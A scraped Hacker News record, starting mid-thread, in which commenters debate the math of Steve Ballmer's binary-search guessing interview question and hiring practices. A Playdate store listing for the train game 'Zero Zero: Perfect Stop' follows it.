that omits this is so vacuously incomplete that it might as well be considered wrong. reply treatmesubj 42 minutes agorootparentfair enough, I guess the TTL exceeded response is how you learn about each hop reply HarryHirsch 2 hours agorootparentprevIs the guy's response really that far off? When you think about it, the candidate isn't even that wrong. Back then, at university, a certain professor would explain the oral exam to the candidate at the beginning. He would explain that he would incrementally increase the difficulty and skip from area to area. The goal would be to find the limits of the student's knowledge, the student would walk away feeling terrible, and he, the professor, didn't enjoy the experience. That's how it ought to be, but here? OK, candidate doesn't know ICMP well, next topic, no need to waste time and dig in. Here's another unfavourable thought: some people with abusive childhoods react very badly to dominance displays, and here is Rachel engaging in just that. One wonders what had happened before. reply SonOfLilit 40 minutes agorootparentDownvoted for jumping from legitimate criticism of her interview methodology to very personal and completely baseless accusations. This is not the internet I want to live in. reply cbsmith 2 hours agorootparentprevThis is why successful organizations shadow interviews. reply hamburglar 4 hours agorootparentprevAnd in particular, this was rampant at Microsoft in the Ballmer days. reply jncfhnb 2 hours agorootparentprev> I see you passed this guy after a single guess. Why was that? > Well, he guessed 69, sir, so I assumed he was doing some serious game theoretic calculations reply enneff 2 hours agorootparentI didn’t mean he passes the entire interview, just that he saw through the question and it’s probably best to move on to something else. reply krisoft 2 hours agorootparentprevNot really. The question was \"Should you accept to play this game?\" That is not a question where a number is an expected answer. reply enneff 2 hours agorootparentI’m assuming the context of making the guess is explaining the thought process. Otherwise how would that even come up? reply gweinberg 54 minutes agoparentprevNo it doesn't, it's quite clear that Ballmer can be choosing adversarially. The point is that even if Ballmer chooses randomly and the interviewee plays optimally given this, the game still has a negative expectation value, and that is enough to be sure the game is a loser for the interviewee. The post never answers the question \"so what is the real expectation value\", which is a more difficult question. But I think if the interviewee chooses a number randomly from 40-60 as the first guess and does a binary search from there, Ballmer can't really improve on choosing his initial number randomly. reply thedavibob 4 hours agoparentprev> you can select an initial guess that is offset from 50 Given that 7 guesses covers 128 numbers, you can offset by +/- 14 without actually affecting the \"worst case\" of the algorithm (i.e. provided you have at most 64 either side of your guess). As you say, randomly selecting this offset would neuter most adversarial examples (purposefully chosen to fall into the gaps of binary search) and would possibly completely remove the benefits from adversarial choice (though a tailored distribution on offset might be required there). I'd be interested in such an analysis too. reply hulium 4 hours agorootparent> Given that 7 guesses covers 128 numbers I might be confused, but don't 7 guesses actually cover 255 numbers? I think you have to count all nodes in the search tree, not only the leafs, because you can get the correct number before reaching a leaf node. Or more generally k guesses cover 2^(k+1)-1 numbers, e.g. with one guess you get the answers correct/high/low, which can cover 3 numbers) Maybe there is a mistake in my thinking, because this would mean you can cover 127 numbers with 6 guesses so you could not lose the original game. Edit: My mistake is that you still have to explicitly guess even if you know the precise answer already, so you cannot cover 3 numbers with 1 guess. This means 7 guesses cover 127 numbers. reply sltkr 4 hours agorootparentYour logic is correct but you are off-by-one. 1 guess gets you 1 number, so the formula is 2^k - 1, and 7 guesses thus covers 127 numbers. You can also view it as a recurrence: f(1) = 1 f(n) = 2*f(n - 1) + 1 = 2^n - 1 But your binary search tree example is more intuitive. reply hulium 4 hours agorootparentYes, you are right. In this game, you can know the answer after 6 guesses, but then you also have to tell him, which counts as the 7th guess. reply hamburglar 3 hours agorootparentprevYou are correct that you can know the answer in 6, but actually winning requires you to “guess” that one last time once you know it. reply wrvn 2 hours agorootparentprevThat approach would still leave you weak to always picking 1 or 100. Without proof, I believe the optimal guessing strategy would perform equal (on average) for every number, to not give the opponent any standout choice (common for optimal strategies, but not always the case). If my math serves me right, that would be an average of log2(100) = 6.64 guesses for any number, which would make you lose 0.64$ on average. reply wrvn 2 hours agorootparentAlthough upon further thinking, you could then sprinkle in some binomial searches to abuse the uniformity. So the -0.64$ is merely a lower bound. reply furyofantares 2 hours agorootparentprevI don't think you have to put your random offset all in the first guess either. Maybe you could random offset +/- 7 on the first guess, +/- 3 or 4 on the next, something like that. reply potsandpans 35 minutes agoparentprevI'm not really married to this idea, but my first reaction is that to assume a random number would be an invalid assumption. The scenario is framed as a zero sum game: one of us wins. The question is, \"should you play?\" In order to answer, you need to be able to determine whether or not there is an optimal strategy that is generally successful.That should include both the assumption that Ballmer has chosen a number adversarial weighed against the random choice. reply jgrahamc 5 hours agoparentprevAnd then if Ballmer assumes the other party assumes he's being adversarial we get into game theory. reply TeMPOraL 4 hours agorootparentThe way forward is to make Ballmer pay with time for screwing with you, which gets us into geopolitics, and then using the resulting MAD dynamics to make the game fair again. That's how adults with keys to the nukes do it :). reply InDubioProRubio 4 hours agorootparentAnd then everyone gets nukes, or at least anti-matter mined in some vacuum chamber copperstatue configuration. reply kibwen 4 hours agorootparentprevThe ultimate conclusion of which is likely that both parties will decay to picking the secret value/first guess randomly (although I'm not sure if the optimal distribution is perfectly flat?), which is also something that we can model. reply gcanyon 3 hours agorootparentSeems like the distribution definitely won’t be flat since the guesser can randomly choose any of the numbers from 37 to 64 as a first guess without losing anything on the large side, so Ballmer starting with any of those increases his chance of having to pay out the $5. Likewise for other numbers there are nuances to what can be guessed. reply massung 4 hours agorootparentprevNever go in against a Sicilian when death is on the line! reply 1123581321 4 hours agorootparentprevI’d pay $5 to watch a short film of Ballmer asking this question to Wallace Shawn’s Vizzini. reply cjfd 4 hours agorootparentprevI have not really studied this but maybe choosing the guess randomly when the number of possibilities is even is already enough to counter an adversarial opponent. Note that 50 is not the only 'optimal' guess in the beginning. 51 is just as good. reply Bognar 2 hours agorootparentAny number between 36 and 64 should be as good! reply leni536 2 hours agorootparentprevYes, this is a Nash equilibrium question. reply aldanor 3 hours agorootparentprevSo the actual problem here is to find Nash equilibrium. reply Someone 1 hour agoparentprev> I'd be interested to see someone do the analysis of what the optimal random-offset-selection algorithm would be to counter trivial adversarial choice If you know your opponent picks a number uniformly from all numbers that lead to a maximum of guesses, the optimum strategy is a binary search between those numbers, making sure to pick one of those numbers at each turn. The problem stays completely symmetric under this condition, so there would be two (maybe four due to edge conditions) optimal first guesses summing to 101. In general, I think the trick still is a binary search where each guess splits the range of options in halves of equal expected/min/max cost (depending on whether you want to optimize for expected/min/max cost). reply auselen 1 hour agoparentprevGenuinely asking - not directly to OP of course, wasn’t this how people were playing the game when you were kids? Not as rigorous, but you intuitively try offsets to get lucky and find the number in fewer tries? reply corecirculator 4 hours agoparentprevOther commenters are wrong in saying that the payout is different for an adversarial choice. The crux of the payout derivation is: we can only cover 1 number in step 1, 2 in step 2, 4 in step 3, 8 in step 4, and so on. You can choose your initial number in binary search randomly, and as long as you meet the above condition is met (# of possible numbers covered in each step), payout should be same as 0.2 reply dagw 3 hours agorootparentIf I 'know' that my opponent is adversarial, then I might assume that he's not picking from the set of 100 possible numbers, but actually from a smaller set of 'adversarial' numbers, like the set that will always take 6 or 7 guesses using the naive binary search approach, and I can adjust my strategy accordingly. reply alexey-salmin 4 hours agorootparentprevYour calculation assumes that probability of each number is the same which is not true for adversarial choice. reply layer8 2 hours agoparentprevIf Ballmer is being adversarial, he won’t pick the number at the start, and always win. Of course you can set up the game such that Ballmer has to commit on a number at the start of the game (by sealing it in an envelope or whatever), but that wasn’t specified. reply jefftk 2 hours agorootparentBallmer opens with \"I'm thinking of a number between 1 and 100\". If he uses your strategy instead that's a different scenario. reply layer8 22 minutes agorootparentThat’s only if you’re willing to trust Ballmer to do what he claims, which I wouldn’t. reply whimsicalism 2 hours agorootparentprevthey’re being adversarial within the framed rules of the game, not breaking the rules of the game? reply readyplayernull 13 minutes agoprevSlowly and for the span of many years I've come to realize that binary search is an amazing problem solving tool, specially on systems that are too big and complex to debug. For example, recently a colleague had a problem with a rendering tool for Figma, of which we don't have the source code. The tool would take too long exporting a specific design. The team mate tried changing things randomly for days to no avail. Each try would take hours and sometimes crashed the browser. The solution I gave him was to remove half of the elements and check how that affects the exporting time. Then keep repeating for the groups that still failed. In a matter of hours he found the element that caused a seemingly infinite loop. reply rawgabbit 9 minutes agoprevI believe what Ballmer wanted to hear are clarifying questions. Eg. Can I stop at any time? If yes, I will stop before I go into the negative. If I cannot stop but must continue the game until I guessed the right number, I will most likely lose money. Then go into a simple computation of XY terms where X is the probability and Y is the payout or loss for maybe a dozen terms. reply justusthane 4 hours agoprevIs there a name for the fallacy where you attribute your success in life to your own intelligence, and thus assume that you are smarter than everyone else, and that you therefor must be right about everything? Sort of an opposite impostor syndrome? reply cranium 2 hours agoparentThe \"fundamental attribution error\" is a bias where people attribute their own success to their inner abilities and other people success to external circumstances. (It's the reverse when thinking about failure) For the second part of \"I'm superior and know-it-all\", I'd say it's good ol' jerk-ery? reply caster_cp 3 hours agoparentprevFundamental attribution error https://en.wikipedia.org/wiki/Fundamental_attribution_error reply a_wild_dandan 53 minutes agorootparentLet’s start calling these stories FAErytales. reply jarito 4 hours agoparentprevNarrative Bias: https://en.wikipedia.org/wiki/Narrative_bias is pretty close. reply greenavocado 1 hour agoparentprevMain character syndrome Narcissistic Personality Disorder Sociopathy reply tcgv 4 hours agoparentprev> an opposite impostor syndrome? Dunning–Kruger effect https://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger_effect reply dustincoates 2 hours agorootparentJust because it's one of my pet peeves, this is not what Dunning Kruger says. What it says is that people who are poorly skilled in a task will overestimate their skill and those highly skilled will underestimate, but not that the poorly skilled estimate themselves to be better than the highly skilled. From the wikipedia article you link: > Among laypeople, the Dunning–Kruger effect is often misunderstood as the claim that people with low intelligence are more confident in their knowledge and skills than people with high intelligence. reply tcgv 1 hour agorootparentMy response was directed specifically at the OP's second question, about the \"opposite\" of impostor syndrome, and not the first one. The dunning krugger effect is widely regarded as the polar opposite of it: - \"If the Dunning-Kruger effect is being overconfident in one's knowledge or performance, its polar opposite is imposter syndrome or the feeling that one is undeserving of success. People who have imposter syndrome are plagued by self-doubts and constantly feel like frauds who will be unmasked any second.\" [1] - \"This is the opposite to the Dunning-Kruger effect. The Imposter Syndrome is a cognitive bias where someone is unable to acknowledge their own competence. Even when they may have multiple successes they struggle to attribute their success to internal factors.\" [2] - \"The opposite of the Peter Principle and Dunning-Kruger effect is the imposter syndrome. This is when smart, capable people underestimate their (...)\" [3] [1] https://www.psychologytoday.com/intl/basics/dunning-kruger-e.... [2] https://www.leedsforlearning.co.uk/Pages/Download/28541a2c-3.... [3] https://www.forbes.com/sites/jackkelly/2022/07/12/what-the-p... reply ckemere 32 minutes agoprevI really am curious about the Nash equilibrium solution. I assume that as a commenter has mentioned, for the guesser it involves returning random numbers near the binary search. But I’m curious if for the picker it involves a uniform or non uniform initial distribution?? I’m sure someone on HN knows/can explain? reply paxys 4 hours agoprevAs an interviewee my first question would be – are you going to play fair, and how can I verify it? reply dannyw 4 hours agoparent“As a SWE, I seek to understand important context first, before jumping to build or code. First, I’d like to ask if you’ll guess randomly and fairly, or adversarially?” “Secondly, when significant money is involved, I make sure to verify any inputs. I’m considering the situation, not you personally, untrusted. How can I verify it, or do you want me to proceed assuming that’s verified?” Those are great questions, but it’s also about how you ask it. SWE is not pure engineering. Communications is vitally important. reply ibbih 4 hours agorootparentwat reply mupuff1234 4 hours agorootparentprev\"as you, my interviewer, are a capable SWE I assume you gave me all the context needed to solve the problem\". The interviewing game of asking clarification questions is silly and should stop. In the system design portion I can understand it, but not when asked a direct technical question. It's perfectly fine to ask followup questions with added constraints or just directly say that the specification is fuzzy and needs to be clarified first, but having that dance around the basic specs in nonsense (as if you wouldn't know if you're dealing with a 10PB array or 1kb at work). reply krisoft 2 hours agorootparent> but not when asked a direct technical question. This is anything but a direct technical question though. > It's perfectly fine to ask followup questions with added constraints, but having the guessing game to figure out those constraints is nonsense. You say that. I say people being able to ask the right question is one of the most important skills to be a productive developer. So of course as an interviewer I want to know if they can do it. I don't know how it works where you are, but we don't have a big book of perfectly defined specifications for our work. I guess if we could get one of those that would improve our productivity. But until we obtain one we will keep testing candidates on their ability to ask questions. reply dakiol 44 minutes agorootparent> I say people being able to ask the right question is one of the most important skills to be a productive developer. But you never know if by asking the \"right\" question you'll jeopardize the entire interview problem. Some interviewers may have only prepared 75% of the problem and haven't went through all the posibilities. If you ask a question that may pose itself as a \"treat\" (e.g., making half the problem non-sense and therefore there's no need to implement it) your interviewer may simply consider you a no-go. And it's not about malice, but simply that you may be better prepared than the interviewer and some times that leads to a no offer. I wouldn't mind working in a place like that, so I don't usually ask \"too clever\" questions. reply mupuff1234 2 hours agorootparentprevSure, and there's a way to test the ability to ask questions that isn't some \"gotcha\" type question. As in interviewer you can just say \"the specifications aren't clear, what questions would you might want to ask to clarify them?\". It's not like in the day to day work you go around defining specifications for every tiny function - the default specification are clear from the work environment. Let's say you had to implement a \"find dups in this array\" at work, you probably won't go around collecting requirements for that, so asking that in an interview and having the silly dance of \"Oh, the interviewee didn't ask if the array fits in memory or not\" is silly imo - and doesn't show anything other than whether the candidate memorized the need to ask that or not. and like I said before, fuzzy specification are more suitable for the system/product design part, and can also be part of the coding part, but they shouldn't appear as some \"gotcha\". reply csmpltn 4 hours agoparentprevI guess you could just ask him to write the number down on a piece of paper, and reveal you the number at the end of the interview :) reply kccqzy 4 hours agorootparentThe candidate who can ask that is already better than the candidate that jumps straight into a solution. If I'm the interviewer, I'd be impressed with such a candidate. And frankly this is a needed skill. Candidates who automatically think about adversarial scenarios tend to write more defensive code, not to mention fewer vulnerabilities. reply dannyw 4 hours agoprevAs with most interview questions, I’d expect this to be about how you think through it and show your work. If an interviewer asked this question and you found a mistake, that probably helps you get the job. reply jkaptur 4 hours agoprevSome other interesting points here: Ballmer works hard to de-emphasize and diplomatically move away from discussing this exact question once it becomes clear that Chang's not approaching it by thinking explicitly about binary search and expected value. Which is not surprising, because she's a professional journalist! It's amazing that Ballmer (like so many technical interviewers) is so pleased with this question that he couldn't help bringing it up, even though it's not really that relevant to Chang's question. reply eterevsky 2 hours agoprevThis is a game with imperfect information, and the optimal strategy for each player is probably different from \"pick any number at random\" and \"run off-the shelf binary search\". reply notfed 49 minutes agoparentHow is it imperfect information? Isn't each guess made openly? reply mekoka 2 hours agoprevHow you end up hiring a mathematician while looking for a programmer. reply jll29 42 minutes agoparentThis can be a big problem in teams that are homogeneous: All were hired using the same process, so all are maths/physics majors with good analytical skills but insufficient software engineering skills. What often happens maths/physics majors excel at programming the small, but cannot architect things in the large. As a friend once put it about one such person: \"He can only do it as long as he can fit the whole problem in his head at once.\" It's great to have mathematicians and physicists in the team. But you for sure want a sufficient number of trained and experienced software engineers as well. reply krisoft 4 hours agoprevIt is also unclear if one has to keep playing. The expected value is very different if after the fifth guess one can thank Balmer for the opportunity and walk away. reply tantalor 4 hours agoparentGood one! Reminds me of the viral video, goes something like \"I'll pay you $20 if I can pour 2 cups of water on your head\" and then only pour 1 cup and walk away. reply netmare 1 hour agorootparentIANAL, but they either have to honor the verbal contract (pour an additional cup AND pay $20) OR the contract is void and therefore they can be sued for assault. Of course, the \"can\" in \"if I can\" may be construed as \"being able to\", but that's up to the jury I guess. reply spullara 50 minutes agoprevI wrote similar code to show that as long as you choose your starting number randomly you will have positive EV. Not sure how they kept using this interview question without realizing this. https://x.com/sampullara/status/1810088483425558630 reply LudwigNagasena 26 minutes agoparentI think they were using it just fine because they don’t say or in any way imply that the choice is random. reply wolfi1 52 minutes agoprevabout the probabilities: say Steve's number is 59. I say 50, Steve says higher, so there are just 50 numbers left and the new probability is 1/50, I say 75, Steve says lower, so the probability is 1/24 (otherwise it would be 1/25), and so on reply zeroonetwothree 4 hours agoprevI believe you’d have to do a game theory analysis to actually get the answer (compute the mixed strategy that produces a Nash equilibrium). My intuition is that this yieldsThe question is \"Should you accept to play this game?\" Absolutely. Best case I can tell everyone I beat Steve Ballmer in a bet. Worst case I tell him to take his winning dollars out my first paycheck... reply toolz 5 hours agoprevTitle is wrong in implying Balmer is incorrect and the article shows that the title is wrong. If clickbait is misleading, then this is worse than clickbait, no? > Ballmer states that the answer is \"No\" for two reasons: firstly, because he can pick numbers that'll be the most difficult for you... The article goes on to show that there are numbers where a binary search always has the guesser paying $1 reply Closi 4 hours agoparentAlthough Ballmer could still be incorrect, because a 'sufficiently logical' player would also presumably know that he could pick numbers that'll be the most difficult to find via binary-search, so by the same logic you could also meta-game it, and assume any number that can be found in 5 steps with a binary search is immediately out. This would narrow the search space to only 37 numbers, which can then easily be found within 5 guesses. But he also knows that you know that he could pick numbers that will be the most difficult... So could then pick one of the numbers that actually are guessable within 5 guesses to trick you. But then you also know that he knows that you know that he could pick difficult numbers too. I'm not entirely sure if this invalidates Ballmer's advantage, but I would be interested to know what the 'perfect' strategy would be for this game considering the meta-game. reply Karliss 4 hours agorootparentThere isn't much of metagame if number is only in Ballmers mind. No matter what guesses you choose he can force you to make at least log_2(100) guesses. Doing anything except splitting in half will only increase amount of guesses. There are two things that can change the game, requiring Baller to write the number on a piece of paper before the start. Other thing you could do is writing a number on piece of paper yourself halfway during the game. If opponent is changing the number adversarially with goal of maximizing guesses you can force them to \"pick\" a specific number. Afterwards you can open the piece of paper and claim that you actually guessed the number with the first attempt. reply Closi 3 hours agorootparentThis assumes Ballmer is cheating, rather than just behaving adversarially but within the rules. If we accept cheating is allowed, we can also potentially accept other 'cheating' scenarios where the player repeatedly punches Ballmer in the face until he discloses the number, thus winning. Or where the player just refuses to pay at the end. IMO the problem is only interesting if we assume any form of cheating isn't allowed. reply uncanneyvalley 3 hours agorootparentDo you want to catch a chair to the side of the head? Because this is how you catch a chair to the side of the head. reply cwmma 4 hours agoparentprevthe article focuses on the next part of that sentence > secondly because the expected value of the game (assuming Ballmer chooses randomly) is negative: you end up paying Ballmer reply toolz 4 hours agorootparentand given that the first rule still holds where he chooses hard numbers, then the expected value of the game is negative (aside from meta-gaming this, which is out of scope for a technical problem) reply michaelt 4 hours agoparentprevAlso the number only exists in Ballmer's mind, so if he wanted to, he could change it to be unfavourable should you make a lucky guess. Here, you can play the game with me. Higher. Lower. Higher. Higher. Lower. Correct. Six guesses, you owe me $1. reply dannyw 4 hours agorootparentYes, and a SWE should consider external inputs untrusted until proven otherwise. reply FabHK 2 hours agorootparentprev0$, as posed. reply pxx 4 hours agorootparentprevyour point is valid but you cannot have a static answer list. if I started off by guessing 50 twice you're cooked. or 50 and 52. reply kevincox 5 hours agoparentprevBut if you know the number picker is going to choose these numbers you can optimize your algorithm. reply toolz 5 hours agorootparentbut you don't know. Only he knows that he's going to pick numbers the binary search will fail on and he states as much as his reason that you shouldn't play the game. reply paxys 5 hours agorootparentprevHow do you know that? reply pbiggar 4 hours agoprev\"Should you accept to play this game?\" Absolutely yes. I like games. The purpose of games is to have fun. This seems like a fun game for like the first $20, a sum I can afford to play a fun game for 10 minutes. Then at the end, I get to say \"I once lost $20 to Steve Balmer playing binary search\", which is a fun sentence I can dine out on, and is worth more than $20 to me. I feel like perhaps this is why MS under Balmer lost relevance. Too busy looking at the technical and not the human. reply 23B1 4 hours agoparentUnderrated comment. His point was to see how they approached the problem regardless of the answer, which is a much different criteria than having the right answer. reply IshKebab 4 hours agoparentprevI don't know why you'd make this comment... I find it hard to believe you're actually stupid enough to not understand the implicit \"(i.e. is your expected profit greater than 0)\". If you answered like this in an interview I would definitely not give you the job. I did actually interview someone once who was like this - \"How would you do this?\" \"Well you shouldn't do it. I think you should do this other thing.\". He did not get the job. reply abbadadda 4 minutes agorootparentThis is greyed out, but I tend to agree with the sentiment that there’s a right way and a wrong way to approach these “EV” questions. OP was a bit harsh with the stupid comment, and for SWEs EV understanding is not usually a critical thing, but ultimately you’re being asked about the probability and the ability to make good decisions. Trading firms make use of this when hiring traders (most famously Jane Street and also SIG); The thinking is that if someone makes bad decisions with toy games, and their thought process is not analytical, they’re going to make for a bad trader, not making good decisions with millions of dollars on the line. A good example of something that would rule out a trader is: You can flip a coin, if you win you get $1m, if you lose you lose $1m. Would you play? The EV is zero, but the question is about bankroll management and disaster avoidance. As an individual the downside risk of a $1m loss (usually) significantly outweighs the upside of a $1m gain. reply LudwigNagasena 36 minutes agorootparentprevI would be concerned if senior stuff wouldn’t speak up and bring up possible technical issues. That’s like half of their value. reply IshKebab 10 minutes agorootparentYes... But not in a technical interview when that's clearly not being asked of you. reply routerl 5 hours agoprevThis write-up makes the erroneous assumption that he's choosing randomly. He himself says, in this same write-up, that he's choosing adversarially. Nice write-up anyway, and yes, Ballmer is wrong. reply cushpush 4 hours agoprevNice, you played the game and you earned $0.20 [twenty cents]. Definitely a bad choice. But then you got viral on HN, and made good on your investment. reply Eumenes 5 hours agoprevDidn't Steve Ballmer start off at MSFT essentially in a biz ops role, supporting execs when the company was super small? Interesting how he became technical as the company grew. Pretty rare. reply sudo_bang_bang 5 hours agoparentHe graduated with a mathematics degree from Harvard so the concept of binary search would have likely been familiar to him. But you’re right, as far as I can tell, he never did any technical work like programming in his career. reply ezero 4 hours agorootparentNot only that, he was also better than Gates at math. From the acquired podcast episode on Microsoft: > Ben: He's gregarious. Anyone who's ever met Steve or seen a video of Steve, you are well aware that this man has a presence. But the thing that people don't know about him is he is so unbelievably analytical. Steve is the guy that outscored Bill Gates on the Putnam exam. source: https://www.acquired.fm/episodes/microsoft reply __coaxialcabal 4 hours agoparentprevIt's surprising the extent to which the tech community overfits towards classifying intelligent individuals as either exclusively technical or nontechnical. Recruiters are especially weak in this regard, e.g., if you've ever been effective at sales or people leadership, you are likely ineffective at swe or data science or vice versa. The most intelligent folks I've worked with are very diverse in their interests and abilities. You can see this in an elementary school GT classroom. Why does the tech community believe this is always an either/or proposition? reply hi-v-rocknroll 2 hours agorootparentYep. Pigeonholing by narrow thinking individuals who aren't accustomed to ambiguity or lateral thinking, especially when exhibit talents in more than just technical areas, a person becomes \"nontechnical\" to a nonzero proportion of technical people while remaining \"too technical\" for a large fraction of business people. PS: Recruiters generally come from the same cloth as car sales and sports, so they're not usually going to be the sharpest pencils in the drawer. reply aeonik 4 hours agorootparentprevTechnical is just a code word for \"having a detailed understanding of something\". Almost everything is technical if you focus on it long enough, because almost everything is complicated. This is because almost everything interacts with the real world, which is hellishly complicated and detailed. reply andrewflnr 3 hours agorootparentThat's a (potentially) good perspective, but not how people use \"technical\" in the wild. reply thaumasiotes 2 hours agorootparentprev> You can see this in an elementary school GT classroom. GT? reply shepherdjerred 1 hour agorootparenthttps://en.wikipedia.org/wiki/Gifted_education reply Eumenes 4 hours agorootparentprevBecause we live in an era of specialization. Look at a companies job page - even startups have silos. I don't think this is strange or unusual. Its hard to be good at everything. If I'm spending 8+ hours per day doing sales, where am I going to find the time to be good at other things? Most people are working for the weekend or to spend time with their families. Diving into far off subjects related to work isn't always exciting. reply re-thc 4 hours agorootparentprev> The most intelligent folks I've worked with are very diverse in their interests and abilities. > as either exclusively technical or nontechnical This applies outside of tech or generally in any role e.g. if you're a backend engineer they assume you don't know frontend or if you're a marketing specialist you're not good at sales. I never get it either. We're people not machines but most people have this assumption like we're a game character - you get a job / trait and that's it. reply re-thc 5 hours agoparentprev> Didn't Steve Ballmer start off at MSFT essentially in a biz ops role Yes, business manager. > Interesting how he became technical as the company grew. That's not clear from this. This shows he knew some concepts as part of managing different teams in the company. reply hi-v-rocknroll 2 hours agorootparentBallmer was good at riding coat-tails of others as a supporting figure but eventually started running MSFT into the ground. He demanded to personally evaluate every M&A activity >$10M. No bueno. reply alexey-salmin 4 hours agoprevDisappointing to see the Nash equilibrium missing from the analysis. reply sobellian 3 hours agoparentFor reasons given in the comments, both players probably choose a mixed strategy at equilibrium. If someone actually managed to find / prove a mixed strategy equilibrium for this game right there in the interview you probably couldn't go wrong hiring them on the spot. reply dvt 5 hours agoprevThe (TV) interview is kind of funny because the journalist asks him, after he goes through the idiotic song and dance of this brain teaser: \"so what did you learn about me?\" This is actually a very insightful question. What did you learn, Mr Ballmer? To which he literally has no answer: \"I learned you need to step back and really ask if you're going to make money on this thing\".. uh, okay Steve. Cool. Thanks for your contribution to possibly the worst technical hiring practices in just about any professional field. The technicals are less interesting than seeing even he himself has no real justification for this kind of intellectual hazing. reply LudwigNagasena 30 minutes agoparentHe was being polite and understanding. They aren’t in a job interview setting, it’s not a correct frame to judge. But if it were, she would totally fail with that attitude of not thinking through the problem. That’s what his comment about stepping back meant. reply seaprune 4 hours agoprev [–] I have opened the article in question. I have NOT worked through the technical problem, the complications and interpretation surrounding Ballmer, nor have I digested the contention being presented. I am capable of these things but I am on the clock and I do not value performing the work required for this particular article. With that said, I wanted to share the following. Perhaps it will spur discussion. Our leadership -- whether in our professional circumstances, in our sovereign and communal circumstances, or in our choice to lead ourselves; perhaps it is in these leaders that a view, or a decision, or a proclamation -- perhaps it is in these impulses that the world is changed. Can you assign truth to an impulse? Is it a communication for consideration? Is it a demand for compliance? I assert that you can do so. The words were spoken. Thus, the impulse was true. If you desire to do so, please consider. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "John Graham-Cumming's blog analyzes Steve Ballmer's binary search interview question, which involves guessing a number between 1 and 100 with varying payouts.",
      "Contrary to Ballmer's claim that the game is unfavorable, the blog demonstrates that using a binary search strategy results in a positive expected value of $0.20 if numbers are chosen randomly.",
      "The blog includes code to support this analysis and discusses potential misunderstandings in Ballmer's reasoning, with comments suggesting alternative strategies and interpretations."
    ],
    "commentSummary": [
      "Steve Ballmer's binary search interview question has ignited debate over its effectiveness in evaluating technical skills.",
      "An interviewee with payments experience was rejected for lacking real-time payments expertise, despite managing conflict well during the process.",
      "Commenters criticized the interview tactics as indicative of a toxic culture and emphasized the importance of admitting knowledge gaps."
    ],
    "points": 171,
    "commentCount": 160,
    "retryCount": 0,
    "time": 1725369171
  },
  {
    "id": 41429232,
    "title": "Playdate Game Zero Zero: Perfect Stop",
    "originLink": "https://play.date/games/zero-zero/",
    "originBody": "Catalog Racing Action Made by Hunter Bridges Challenge your skills as a train driver! Stop in the right place, at the right time. Maintain your timetable as you glide through scenic Yamanashi. Welcome aboard the Fuji Express! Zero Zero: Perfect Stop is a train driving game where you use the crank to control the train's throttle and brakes. In Driver's Mode, navigate the course diagram, observe speed limits, and achieve target objectives as you try to stop at each station as punctually and precisely as possible. Challenge 1-stop, 3-stop, 5-stop, and Express diagrams along the Fuji Express as you approach Mt. Fuji. Challenge your own high scores, or other drivers' across the globe on the online leaderboards. Or, enjoy the sights with no stress in Free Mode! There is also a Tutorial for new players. Enjoy the vast scenery, and a unique challenge of patience and precision! (This game supports English and Japanese) (このゲームは日本語でもＯＫです) Design, Programming, Music by Hunter Bridges Title Screen, Character Art by Paul Veer English Announcements by Donna Burke Japanese Announcements by Lola Shiraishi Dialogue Editing by Brad Flick Key Art by さゆき(Sayuki) Scoreboards 09 - Mitsutouge to Mt. Fuji, Express 1 Moppi 984,924 2 SoinkstersChris 983,296 3 Glenjamin 979,804 4 Phiroth 927,894 5 zipmon 919,522 6 1655044158154447 884,037 7 jontomato 877,104 8 SpaceJace 876,146 9 orkn 871,456 10 IvanJoukov 858,876 01 - Mitsutouge to Mt. Fuji, Local 1 Mamaluigi145 977,402 2 Glenjamin 971,680 3 SoinkstersChris 956,436 4 Moppi 942,069 5 IvanJoukov 915,910 6 zipmon 912,742 7 hunty 905,879 8 thebitstick 891,257 9 6229233127285014 890,993 10 india 874,529 02 - Mitsutouge to Kotobuki, Local 1 SoinkstersChris 975,988 2 Moppi 974,033 3 zipmon 973,900 4 Mamaluigi145 968,333 5 Glenjamin 962,333 6 IvanJoukov 945,754 7 stefb 941,033 8 SpaceJace 934,467 9 hunty 920,933 10 6229233127285014 909,197 03 - Kotobuki to Yoshiike Onsenmae, Local 1 Glenjamin 989,634 2 SoinkstersChris 984,525 3 zipmon 977,500 4 Moppi 957,516 5 9840919989858549 942,756 6 6229233127285014 939,768 7 Phiroth 938,947 8 9808599591265569 932,714 9 IvanJoukov 929,315 10 TheRailBaron 927,569 04 - Yoshiike Onsenmae to Shimoyoshida, Local 1 SoinkstersChris 985,679 2 zipmon 974,760 3 Glenjamin 973,580 4 Moppi 966,919 5 hunty 962,436 6 SpaceJace 961,683 7 7933707719207984 947,405 8 stefb 934,399 9 IvanJoukov 924,151 10 kohlrobi 922,099 05 - Shimoyoshida to Gekkoji, Local 1 SoinkstersChris 981,338 2 zipmon 979,709 3 hunty 975,689 4 Glenjamin 958,721 5 heyimludo 958,283 6 3396169507696406 952,002 7 Moppi 951,178 8 marinebean 938,452 9 stefb 937,714 10 Saiklex 934,937 06 - Gekkoji to Mt. Fuji, Local 1 SoinkstersChris 974,089 2 Moppi 969,487 3 zipmon 963,300 4 Mamaluigi145 961,996 5 Glenjamin 951,436 6 IvanJoukov 934,598 7 rae 929,196 8 8667528259685510 922,046 9 Saiklex 917,554 10 SpaceJace 909,992 07 - Mitsutouge to Shimoyoshida, Local 1 SoinkstersChris 973,102 2 Glenjamin 961,250 3 Moppi 945,504 4 Mamaluigi145 940,118 5 stefb 902,617 6 IvanJoukov 876,920 7 zipmon 873,654 8 idolminds 865,841 9 Phiroth 856,137 10 fbpop 849,310 08 - Yoshiike Onsenmae to Mt. Fuji, Local 1 SoinkstersChris 971,502 2 Glenjamin 965,809 3 Moppi 949,659 4 Mamaluigi145 939,712 5 zipmon 936,016 6 Nixx 908,738 7 Phiroth 901,794 8 IvanJoukov 895,580 9 rae 884,567 10 6229233127285014 878,793 More cool info Website Player's Guide Original Soundtrack Game support Featured In… Racing Action 119.0 MB. First published 08/27/2024 This game is appropriate for everyone. This game primarily uses the crank and directional buttons. Crank controls require a fair amount of precision. The game can be played with buttons instead of the crank. 💜 Buy $6 + tax You'll need to add a payment method before completing your purchase. Something went wrong.",
    "commentLink": "https://news.ycombinator.com/item?id=41429232",
